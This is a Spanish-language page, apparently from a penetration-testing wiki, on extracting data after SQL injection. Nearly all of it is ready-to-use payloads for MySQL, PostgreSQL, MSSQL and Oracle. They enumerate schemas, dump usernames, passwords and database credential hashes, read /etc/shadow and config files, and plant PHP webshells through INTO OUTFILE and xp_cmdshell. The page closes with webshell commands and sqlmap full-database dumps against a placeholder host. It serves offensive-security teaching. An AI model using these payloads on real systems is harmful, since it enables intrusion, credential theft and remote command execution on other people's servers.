---
icon: database
---

# Exfiltración de Datos

Una vez confirmada y explotada la inyección, el siguiente paso es extraer la información relevante: credenciales, datos sensibles, archivos del sistema, o estructuras de la base de datos completa.

### Flujo de exfiltración

```
1. Identificar DBMS y versión
2. Obtener base de datos actual
3. Enumerar bases de datos disponibles
4. Enumerar tablas de la BD objetivo
5. Enumerar columnas de las tablas interesantes
6. Extraer datos
7. (Opcional) Leer/escribir archivos del sistema
```

### 1. Fingerprinting del DBMS

```sql
-- MySQL
@@version                         → 8.0.32-MySQL Community Server
@@global.version_compile_os       → Linux
version()

-- PostgreSQL
version()                         → PostgreSQL 14.5 on x86_64-linux

-- MSSQL
@@version                         → Microsoft SQL Server 2019
@@servername
db_name()

-- Oracle
SELECT banner FROM v$version WHERE rownum=1
SELECT * FROM v$version
```

### 2. Enumerar bases de datos

```sql
-- MySQL / PostgreSQL / MSSQL
SELECT schema_name FROM information_schema.schemata
SELECT group_concat(schema_name) FROM information_schema.schemata  -- todo en uno (MySQL)

-- MySQL directo
SHOW DATABASES;

-- Oracle
SELECT DISTINCT owner FROM all_tables
SELECT ora_database_name FROM dual

-- MSSQL
SELECT name FROM master..sysdatabases
SELECT name FROM sys.databases
```

### 3. Enumerar tablas

```sql
-- MySQL / PostgreSQL / MSSQL
SELECT table_name FROM information_schema.tables WHERE table_schema = 'target_db'
SELECT table_name FROM information_schema.tables WHERE table_schema = database()

-- Varias tablas de golpe (MySQL)
SELECT group_concat(table_name ORDER BY table_name) FROM information_schema.tables WHERE table_schema=database()

-- Oracle
SELECT table_name FROM all_tables WHERE owner = 'TARGET_SCHEMA'
SELECT table_name FROM user_tables

-- MSSQL
SELECT name FROM sysobjects WHERE type='U'
SELECT name FROM sys.tables
USE target_db; SELECT name FROM sys.tables

-- PostgreSQL
SELECT tablename FROM pg_tables WHERE schemaname='public'
```

### 4. Enumerar columnas

```sql
-- MySQL / PostgreSQL / MSSQL
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users'
SELECT column_name FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database()

-- Oracle
SELECT column_name, data_type FROM all_tab_columns WHERE table_name = 'USERS'

-- MSSQL
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('users')
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'
```

### 5. Extraer datos

#### Extracción básica fila a fila

```sql
-- MySQL — LIMIT para paginar
SELECT username, password FROM users LIMIT 0,1
SELECT username, password FROM users LIMIT 1,1
SELECT username, password FROM users LIMIT 2,1

-- MSSQL — TOP + NOT IN para paginar
SELECT TOP 1 username FROM users
SELECT TOP 1 username FROM users WHERE username NOT IN (SELECT TOP 1 username FROM users)
SELECT TOP 1 username FROM users WHERE username NOT IN (SELECT TOP 2 username FROM users)

-- Oracle — ROWNUM
SELECT username FROM users WHERE ROWNUM=1
SELECT username FROM users WHERE ROWNUM=1 AND username NOT IN (SELECT username FROM users WHERE ROWNUM=1)

-- PostgreSQL
SELECT username FROM users LIMIT 1 OFFSET 0
SELECT username FROM users LIMIT 1 OFFSET 1
```

#### Extraer múltiples filas en una sola consulta

```sql
-- MySQL
SELECT group_concat(username, ':', password SEPARATOR '\n') FROM users

-- PostgreSQL
SELECT string_agg(username || ':' || password, chr(10)) FROM users

-- MSSQL
SELECT STRING_AGG(username + ':' + password, CHAR(10)) FROM users

-- Oracle (XML trick para concatenar)
SELECT listagg(username || ':' || password, ',') WITHIN GROUP (ORDER BY username) FROM users
```

### 6. Leer archivos del sistema

#### MySQL — load\_file()

```sql
-- Requiere: FILE privilege + secure_file_priv vacío o path permitido
SELECT load_file('/etc/passwd')
SELECT load_file('/etc/shadow')
SELECT load_file('C:\\Windows\\win.ini')
SELECT load_file('C:\\inetpub\\wwwroot\\web.config')
SELECT load_file('/var/www/html/config.php')

-- Integrado en Union-Based
' UNION SELECT NULL, load_file('/etc/passwd'), NULL -- -

-- Integrado en Error-Based
' AND extractvalue(1,concat(0x7e,(SELECT load_file('/etc/passwd')))) -- -
```

#### MSSQL - BULK INSERT / OPENROWSET

```sql
-- Leer archivo via BULK INSERT
CREATE TABLE #tmp (content varchar(8000));
BULK INSERT #tmp FROM 'C:\Windows\win.ini' WITH (ROWTERMINATOR = '\n');
SELECT * FROM #tmp;

-- OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS t
```

#### PostgreSQL - pg\_read\_file()

```sql
-- Solo superuser
SELECT pg_read_file('/etc/passwd', 0, 100000)
SELECT pg_ls_dir('/etc')
```

### 7. Escribir archivos (webshell)

#### MySQL - INTO OUTFILE / DUMPFILE

```sql
-- Requiere FILE privilege + ruta dentro de secure_file_priv o en wwwroot

-- Webshell PHP
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'

-- Integrado en UNION
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/cmd.php' -- -

-- Uso del webshell
https://target.com/cmd.php?cmd=id
https://target.com/cmd.php?cmd=whoami
https://target.com/cmd.php?cmd=cat+/etc/passwd
```

#### MSSQL - xp\_cmdshell

```sql
-- Escribir webshell via xp_cmdshell + echo
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'
EXEC xp_cmdshell 'powershell -c "''<?php system($_GET[chr(99)+chr(109)+chr(100)]); ?>'' | Out-File C:\inetpub\wwwroot\shell.php"'
```

### 8. Usuarios y privilegios de la base de datos

```sql
-- MySQL
SELECT user, host, authentication_string FROM mysql.user
SELECT user() -- usuario actual
SELECT current_user()
SHOW GRANTS FOR 'user'@'host'

-- PostgreSQL
SELECT usename, passwd FROM pg_shadow  -- requiere superuser
SELECT current_user
SELECT rolname, rolsuper FROM pg_roles

-- MSSQL
SELECT name, password_hash FROM sys.sql_logins
SELECT system_user
SELECT IS_SRVROLEMEMBER('sysadmin')  -- verificar si es admin

-- Oracle
SELECT username, password FROM dba_users  -- requiere DBA
SELECT * FROM session_privs
SELECT * FROM user_sys_privs
```

### Tips

> Siempre verificar primero **qué privilegios tiene el usuario de la DB**. El usuario `www-data` conectado a MySQL raramente tiene FILE privilege.

> Buscar tablas con nombres como: `users`, `admin`, `accounts`, `credentials`, `config`, `settings`, `tokens`, `sessions`.

> En MySQL con `group_concat`, el límite por defecto es **1024 caracteres**. Si los datos se cortan, usar `LIMIT`/`OFFSET` para paginar o filtrar.

> Para exfiltración masiva, sqlmap con `--dump` y `-T users` es mucho más eficiente que hacerlo manualmente.

```bash
# Dump completo de una tabla con sqlmap
sqlmap -u "https://target.com/item?id=1" -D target_db -T users --dump

# Dump de toda la base de datos
sqlmap -u "https://target.com/item?id=1" -D target_db --dump-all
```
